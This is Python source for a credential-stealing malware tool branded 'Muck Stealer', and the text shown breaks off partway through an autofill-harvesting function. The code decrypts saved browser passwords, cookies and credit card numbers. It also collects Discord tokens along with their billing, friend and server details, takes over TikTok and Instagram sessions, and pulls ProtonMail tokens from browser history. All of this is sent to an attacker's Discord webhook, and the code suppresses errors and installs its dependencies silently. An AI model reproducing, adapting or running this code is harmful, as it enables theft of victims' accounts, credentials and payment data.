
# .___  ___.   ______    _______   __    __   __       _______     _______.
# |   \/   |  /  __  \  |       \ |  |  |  | |  |     |   ____|   /       |
# |  \  /  | |  |  |  | |  .--.  ||  |  |  | |  |     |  |__     |   (----`
# |  |\/|  | |  |  |  | |  |  |  ||  |  |  | |  |     |   __|     \   \    
# |  |  |  | |  `--'  | |  '--'  ||  `--'  | |  `----.|  |____.----)   |   
# |__|  |__|  \______/  |_______/  \______/  |_______||_______|_______/    
                                                                         


import os
import io
import re
import time
import gzip
import json
import shutil
import random
import hashlib
import warnings
import threading
import subprocess
import uuid
from sys import executable, stderr
import requests
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

# .___  ___.   ______    _______   __    __   __       _______     _______.
# |   \/   |  /  __  \  |       \ |  |  |  | |  |     |   ____|   /       |
# |  \  /  | |  |  |  | |  .--.  ||  |  |  | |  |     |  |__     |   (----`
# |  |\/|  | |  |  |  | |  |  |  ||  |  |  | |  |     |   __|     \   \    
# |  |  |  | |  `--'  | |  '--'  ||  `--'  | |  `----.|  |____.----)   |   
# |__|  |__|  \______/  |_______/  \______/  |_______||_______|_______/    



class NullWriter(object):
    def write(self, arg):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
stderr = null_writer





ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)

from Crypto.Cipher import AES



# ░██╗░░░░░░░██╗███████╗██████╗░██╗░░██╗░█████╗░░█████╗░██╗░░██╗
# ░██║░░██╗░░██║██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░██╔╝
# ░╚██╗████╗██╔╝█████╗░░██████╦╝███████║██║░░██║██║░░██║█████═╝░
# ░░████╔═████║░██╔══╝░░██╔══██╗██╔══██║██║░░██║██║░░██║██╔═██╗░
# ░░╚██╔╝░╚██╔╝░███████╗██████╦╝██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗
# ░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝



hook = "WEBHOOK_HERE"



# ░██╗░░░░░░░██╗███████╗██████╗░██╗░░██╗░█████╗░░█████╗░██╗░░██╗
# ░██║░░██╗░░██║██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░██╔╝
# ░╚██╗████╗██╔╝█████╗░░██████╦╝███████║██║░░██║██║░░██║█████═╝░
# ░░████╔═████║░██╔══╝░░██╔══██╗██╔══██║██║░░██║██║░░██║██╔═██╗░
# ░░╚██╔╝░╚██╔╝░███████╗██████╦╝██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗
# ░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝











class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def getip():
    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:return "None"

def zipfolder(foldername, target_dir):            
    zipobj = ZipFile(temp+"/"+foldername + '.zip', 'w', ZIP_DEFLATED)
    rootlen = len(target_dir) + 1
    for base, dirs, files in os.walk(target_dir):
        for file in files:
            fn = os.path.join(base, file)
            if not "user_data" in fn:
                zipobj.write(fn, fn[rootlen:])

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except:pass
            return decrypted_pass

def LoadUrlib(hook, data='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
            else:
                r = urlopen(Request(hook, data=data))
            return r
        except: 
           pass

def globalInfo():
    try:
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{IP}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
        contry = ipdata["country_name"]
        contryCode = ipdata["country_code"].lower()
        if contryCode == "not found":
            globalinfo = f"`{username.upper()} | {IP} ({contry})`"
        else:
            globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {IP} ({contry})`"
        return globalinfo

    except:
        return f"`{username.upper()}`"

def Trust(Cookies):
    # simple Trust Factor system - OFF for the moment
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED



def getCodes(token):
    try:
        codes = ""
        headers = {"Authorization": token,"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())

        for code in codess:
            try:codes += f":tickets: **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
            except:pass

        nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
        if nitrocodess == []: return codes

        for element in nitrocodess:
            
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']

            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = loads(urlopen(Request(url, headers=headers)).read().decode())

            for el in nitrrrro:
                cod = el['code']
                try:codes += f":tickets: **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
                except:pass
        return codes
    except:return ""

# credit to NinjaRideV6 for this function
def getbillq(token):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    billq = "`(LQ Billing)`"
    try:
        bill = loads(urlopen(Request("https://discord.com/api/v9/users/@me/billing/payments?limit=20",headers=headers)).read().decode())
        if bill == []: bill = ""
        elif bill[0]['status'] == 1: billq = "`(HQ Billing)`"
    except: pass
    return billq

url = "https://discord.com"

response = requests.get(url)

unique_id = uuid.uuid4()

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False

    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing

def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]

    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges




# $$\      $$\ $$\   $$\  $$$$$$\  $$\   $$\ 
# $$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |
# $$$$\  $$$$ |$$ |  $$ |$$ /  \__|$$ |$$  / 
# $$\$$\$$ $$ |$$ |  $$ |$$ |      $$$$$  /  
# $$ \$$$  $$ |$$ |  $$ |$$ |      $$  $$<   
# $$ |\$  /$$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
# $$ | \_/ $$ |\$$$$$$  |\$$$$$$  |$$ | \$$\ 
# \__|     \__| \______/  \______/ \__|  \__|
                                           
                                           
                                           





def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
        {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2',              'Value': 16384,     'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter',                 'Value': 512,       'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance',                   'Value': 256,       'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance',                'Value': 128,       'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery',                   'Value': 64,        'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1',              'Value': 8,         'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events',                'Value': 4,         'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"] and not badge["Name"] == "Active_Developer":
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | **{friend['user']['username']}#{friend['user']['discriminator']}** `({friend['user']['id']})`\n"
    return uhqlist if uhqlist != '' else "`No HQ Friends`"




# $$\      $$\ $$\   $$\  $$$$$$\  $$\   $$\ 
# $$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |
# $$$$\  $$$$ |$$ |  $$ |$$ /  \__|$$ |$$  / 
# $$\$$\$$ $$ |$$ |  $$ |$$ |      $$$$$  /  
# $$ \$$$  $$ |$$ |  $$ |$$ |      $$  $$<   
# $$ |\$  /$$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
# $$ | \_/ $$ |\$$$$$$  |\$$$$$$  |$$ | \$$\ 
# \__|     \__| \______/  \______/ \__|  \__|
                                           
                                           
                                           





def GetUHQGuilds(token):
    try:
        uhqguilds = ""
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
        for guild in guilds:
            if guild["approximate_member_count"] < 50: continue
            if guild["owner"] or guild["permissions"] == "4398046511103":
                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
                try:    cc = "https://discord.gg/"+str(inv[0]['code'])
                except: cc = False
                uhqguilds += f"<:I_Join:928302098284691526> [{guild['name']}]({cc}) `({guild['id']})` **{str(guild['approximate_member_count'])} Members**\n"
        if uhqguilds == "": return "`No HQ Guilds`"
        return uhqguilds
    except:
        return "`No HQ Guilds`"

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`' if userjson["phone"] != None else "-"

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

class ttsign: #this is the cleanest code ive ever written
    def __init__(self,params:str,data:str,cookies:str)->None:self.params,self.data,self.cookies=params,data,cookies
    def hash(self,data:str)->str:return str(hashlib.md5(data.encode()).hexdigest())
    def get_base_string(self)->str:base_str=self.hash(self.params);base_str=(base_str+self.hash(self.data)if self.data else base_str+str("0"*32));base_str=(base_str+self.hash(self.cookies)if self.cookies else base_str+str("0"*32));return base_str
    def get_value(self)->json:return self.encrypt(self.get_base_string())
    def encrypt(self,data:str)->json:
     unix,len,key,result,param_list=int(time.time()),0x14,[0xDF,0x77,0xB9,0x40,0xB9,0x9B,0x84,0x83,0xD1,0xB9,0xCB,0xD1,0xF7,0xC2,0xB9,0x85,0xC3,0xD0,0xFB,0xC3],"",[]
     for i in range(0,12,4):
      temp=data[8*i:8*(i+1)]
      for j in range(4):H = int(temp[j*2:(j+1)*2],16);param_list.append(H)
     param_list.extend([0x0,0x6,0xB,0x1C]);H=int(hex(int(unix)),16);param_list.append((H&0xFF000000)>>24);param_list.append((H&0x00FF0000)>>16);param_list.append((H&0x0000FF00)>>8);param_list.append((H&0x000000FF)>>0);eor_result_list = []
     for A,B in zip(param_list,key):eor_result_list.append(A^B)
     for i in range(len):C=self.reverse(eor_result_list[i]);D=eor_result_list[(i + 1)%len];E=C^D;F=self.rbit_algorithm(E);H=((F^0xFFFFFFFF)^len)&0xFF;eor_result_list[i]=H
     for param in eor_result_list:result+=self.hex_string(param)
     return {"x-ss-req-ticket":str(int(unix*1000)),"x-khronos":str(int(unix)),"x-gorgon":("0404b0d30000"+result)}
    def rbit_algorithm(self, num):
     result,tmp_string= "",bin(num)[2:]
     while len(tmp_string)<8:tmp_string="0"+tmp_string
     for i in range(0,8):result=result+tmp_string[7-i]
     return int(result,2)
    def hex_string(self,num):
     tmp_string=hex(num)[2:]
     if len(tmp_string)<2:tmp_string="0"+tmp_string
     return tmp_string
    def reverse(self, num):tmp_string=self.hex_string(num);return int(tmp_string[1:]+tmp_string[:1],16)

def TiktokInfo(sessionid):
    global ttusrnames
    params = f"device_type=SM-G988N&app_name=musical_ly&channel=googleplay&device_platform=android&iid={int(bin(int(time.time()))[2:] + '10100110110100110000011100000101', 2)}&version_code=180805&device_id={int(bin(int(time.time()))[2:] + '00101101010100010100011000000110', 2)}&os_version=7.1.2&aid=1233"
    url = "https://api19-va.tiktokv.com/aweme/v1/user/profile/self/?" + params
    headers = {
        **ttsign(params, None, None).get_value(),
        "Host": "api19-va.tiktokv.com",
        "Connection": "keep-alive",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/3.12.1",
        "passport-sdk-version": "19",
        "sdk-version": "2",
        "cookie": "sessionid={};".format(sessionid)
    }
    res = urlopen(Request(url, headers=headers)).read()
    try:
        jsson = loads(res.decode(errors="ignore"))["user"]
    except:
        jsson = loads(gzip.GzipFile(fileobj=io.BytesIO(res)).read().decode(errors='ignore'))["user"]
    if not jsson["unique_id"] in ttusrnames:
        ttusrnames.append(jsson["unique_id"])
        return [{
            "name": "<:tiktok:883079597187530802> Tiktok", 
            "value": f"**Username:** [{jsson['unique_id']}](https://tiktok.com/@{jsson['unique_id']})\n**Followers:** {jsson['follower_count']}\n**Likes:** {jsson['total_favorited']}", 
            "inline": False
        }]
    return []

def InstagramInfo(token):
    headers = {
        'authority': 'www.instagram.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
        'Cookie': f'sessionid={token}'
    }
    response = str(urlopen(Request('https://www.instagram.com/', headers=headers)).read())
    
    usernam = response.split('\\\\"username\\\\":\\\\"')[1].split('\\\\"')[0]
    idd = response.split(',{"appId":"')[1].split('"')[0]

    headers2 = {
        'accept': '*/*',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
        'x-ig-app-id': idd,
        'Cookie': f'sessionid={token}'
    }
    r2 = loads(urlopen(Request(f'http://i.instagram.com/api/v1/users/web_profile_info/?username={usernam}', None, headers2)).read().decode(errors="ignore"))
    sheeps = r2["data"]["user"]["edge_followed_by"]["count"]
    following = r2["data"]["user"]["edge_follow"]["count"]

    return [{"name": "Instagram", "value": f"**Username:** [{usernam}](https://www.instagram.com/{usernam})\n**Followers:** {sheeps}\n**Following:** {following}", "inline": False}]



# $$\      $$\ $$\   $$\  $$$$$$\  $$\   $$\ 
# $$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |
# $$$$\  $$$$ |$$ |  $$ |$$ /  \__|$$ |$$  / 
# $$\$$\$$ $$ |$$ |  $$ |$$ |      $$$$$  /  
# $$ \$$$  $$ |$$ |  $$ |$$ |      $$  $$<   
# $$ |\$  /$$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  
# $$ | \_/ $$ |\$$$$$$  |\$$$$$$  |$$ | \$$\ 
# \__|     \__| \______/  \______/ \__|  \__|
                                           
                                           
                                           





def getaccountsinfo():
    global History, Cookies, Bookmarks, Passw
    data = []

    if "instagram" in str(Cookies):
        for line in Cookies:
            if "instagram" in line and "sessionid" in line:
                try: 
                    token = line.split("V41U3: ")[1]
                    data += InstagramInfo(token)
                except: pass
    if "tiktok" in str(Cookies):
        for line in Cookies:
            if "tiktok" in line and "sessionid" in line:
                try: 
                    token = line.split("V41U3: ")[1]
                    data += TiktokInfo(token)
                except: pass
    
    if "protonmail" in str(History):
        for line in History:
            if "proton.me/login" in line and "state=" in line:
                try:
                    token = line.split("state=")[1]
                    if "&" in token:
                        token2 = token.split("&")[0]
                        token = token2
                    data += [{"name": "ProtonMail", "value": f"[URL]({line})\n**Token:** {token}", "inline": False}]
                    break
                except: pass
    upload("Data Searcher", data)

def Trim(obj):
    if len(obj) > 1000: 
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj)+ len(i) >= 1000: 
                obj += "..."
                break
            obj += i + "\n"
    return obj

def uploadToken(token, path):

    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://i.imgur.com/Npe8QuD.png"
    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = Trim(GetUHQFriends(token))
    guilds = Trim(GetUHQGuilds(token))
    codes = Trim(getCodes(token))
    billq = getbillq(token)

    if codes == "": codes = "`No Codes`"
    if billing == "": billing = ":lock:"
    if badge == "" and nitro == "": badge, nitro = ":lock:", ""
    if phone == "": phone = "-"
    if friends == "": friends = ":lock:"
    if guilds == "": guilds = ":lock:"
    path = path.replace("\\", "/")

    data = {
        "content": f'Muck Stealer',
        "embeds": [
            {
            "2895667": 14406413,
            "fields": [
                {
                    "name": "Token:",
                    "value": f"`{token}`"
                },
                {
                    "name": "Gmail:" if "@gmail.com" in email else "Mail:",
                    "value": f"`{email}`",
                    "inline": False
                },
                {
                    "name": "Phone:",
                    "value": f"`{phone}`",
                    "inline": False
                },
                {
                    "name": "IP:",
                    "value": f"`{IP}`",
                    "inline": False
                },
                {
                    "name": "Badges:",
                    "value": nitro + badge,
                    "inline": False
                },
                {
                    "name": "Billing:",
                    "value": f"{billing} {billq}",
                    "inline": False
                },
                {
                    "name": "HQ Friends:",
                    "value": friends,
                    "inline": False
                },
                {
                    "name": "HQ Guilds:",
                    "value": guilds,
                    "inline": False
                },
                {
                    "name": "Gift codes:",
                    "value": codes,
                    "inline": False
                }
                
                ],
            "author": {
                "name": f"{username}",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "Muck | https://github.com/frankxrs",
                "icon_url": "https://i.imgur.com/Npe8QuD.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "attachments": []
        }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):

    # return

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if "Data Searcher" in name:
        data = {
            "content": GLINFO,
            "embeds": [
                {
                "title": f"Muck | Data Extractor",
                "2895667": 2895667,
                "fields": link,
                "footer": {
                    "text": "Muck | https://github.com/frankxrs",
                    "icon_url": "https://i.imgur.com/Npe8QuD.png"
                },
                }
            ],
            "avatar_url": "https://i.imgur.com/Npe8QuD.png",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return



    if "NationsGlory" in name:
        data = {
            "content": GLINFO,
            "embeds": [
                {
                "title": f"Muck | {name.split(';')[0]}",
                "2895667": 2895667,
                "fields": link,
                "footer": {
                    "text": "Muck | https://github.com/frankxrs",
                    "icon_url": "https://i.imgur.com/Npe8QuD.png"
                },
                "thumbnail": {
                    "url": name.split(';')[1]
                }
                }
            ],
            "avatar_url": "https://i.imgur.com/Npe8QuD.png",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return
    
    if name == "kiwi":
        string = link.split("\n\n")
        endlist = []
        for i in string:
            i = i.split("\n")
            i = list(filter(None, i))
            val = ""
            for x in i:
                if x.startswith("└─"):
                    val += x + "\n"
            if len(i) > 1:
                endlist.append({"name": i[0], "value": val, "inline": False})
        data = {
            "content": GLINFO,
            "embeds": [
                {
                "2895667": 14406413,
                "fields": endlist,
                "title": f"File Stealer",
                "footer": {
                    "text": "Muck | https://github.com/frankxrs",
                    "icon_url": "https://i.imgur.com/Npe8QuD.png"
                }
                }
            ],
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\muck{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                Tokens += token
                                uploadToken(token, path)


def SqlThing(pathC, tempfold, cmd):
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(cmd)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    return data


def FirefoxCookie():
    try:
        global Cookies, CookiCount
        firefoxpath = f"{roaming}/Mozilla/Firefox/Profiles"
        if not os.path.exists(firefoxpath): return
        subprocess.Popen(f"taskkill /im firefox.exe /t /f >nul 2>&1", shell=True)
        for subdir, dirs, files in os.walk(firefoxpath):
            for file in files:
               if file.endswith("cookies.sqlite"):
                    tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
                    shutil.copy2(os.path.join(subdir, file), tempfold)
                    conn = sql_connect(tempfold)
                    cursor = conn.cursor()
                    cursor.execute("select * from moz_cookies ")
                    data = cursor.fetchall()
                    cursor.close()
                    conn.close()
                    os.remove(tempfold)
                    for row in data:
                        if row[0] != '':
                            Cookies.append(f"H057 K3Y: {row[4]} | N4M3: {row[2]} | V41U3: {row[3]}")
                            CookiCount += 1
    except: pass

def getPassw(path, arg):
    try:
        global Passw, PasswCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SqlThing(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in paswWords: paswWords.append(old)
                Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
                PasswCount += 1
        writeforfile(Passw, 'passwords')
    except:pass

def getCookie(path, arg):
    try:
        global Cookies, CookiCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SqlThing(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")

        pathKey = path + "/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in keyword:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in cookiWords: cookiWords.append(old)
                Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
                CookiCount += 1
        writeforfile(Cookies, 'cookies')
    except:pass

def getCCs(path, arg):
    try:
        global CCs, CCsCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SqlThing(pathC, tempfold, "SELECT * FROM credit_cards ")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {DecryptValue(row[4], master_key)} | EXPIRY: {row[2]}/{row[3]}")
                CCsCount += 1
        writeforfile(CCs, 'creditcards')
    except:pass

def getAutofill(path, arg):
    try:
        global Autofill, AutofillCount
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "muck" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

